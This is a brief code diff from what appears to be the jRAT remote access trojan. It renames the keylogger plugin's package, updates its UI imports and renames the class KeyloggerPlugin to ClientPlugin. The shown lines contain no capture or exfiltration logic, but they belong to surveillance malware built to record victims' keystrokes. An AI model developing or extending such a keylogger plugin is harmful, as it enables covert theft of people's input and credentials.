@@ -1,4 +1,4 @@
-package pro.jrat.plugin.client;
+package pro.jrat.plugin.keylogger.client;
 
 import java.awt.event.ActionListener;
 import java.io.DataInputStream;
@@ -18,12 +18,12 @@ import pro.jrat.api.events.OnDisconnectEvent;
 import pro.jrat.api.events.OnEnableEvent;
 import pro.jrat.api.events.OnPacketEvent;
 import pro.jrat.api.events.OnSendPacketEvent;
-import pro.jrat.plugin.client.ui.DayTreeNode;
-import pro.jrat.plugin.client.ui.MonthTreeNode;
-import pro.jrat.plugin.client.ui.PanelKeylogger;
-import pro.jrat.plugin.client.ui.YearTreeNode;
+import pro.jrat.plugin.keylogger.client.ui.DayTreeNode;
+import pro.jrat.plugin.keylogger.client.ui.MonthTreeNode;
+import pro.jrat.plugin.keylogger.client.ui.PanelKeylogger;
+import pro.jrat.plugin.keylogger.client.ui.YearTreeNode;
 
-public class KeyloggerPlugin extends RATPlugin {
+public class ClientPlugin extends RATPlugin {
 
 	public static final String ICON_LOCATION = System.getProperty("jrat.dir") + File.separator + "plugins/Keylogger/icon.png";
 	public static final byte KEY_HEADER = 121;
